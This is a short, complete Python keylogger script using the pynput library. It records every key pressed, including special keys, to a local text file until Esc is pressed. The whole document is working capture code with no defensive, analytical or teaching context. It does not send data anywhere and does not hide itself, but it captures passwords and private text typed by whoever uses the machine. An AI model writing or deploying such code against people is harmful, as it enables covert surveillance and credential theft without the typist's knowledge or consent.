from pynput import keyboard

# The file where we will log the keystrokes
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Function to handle key release events (optional, can be omitted)
def on_release(key):
    # To stop the key logger, you can define a condition
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
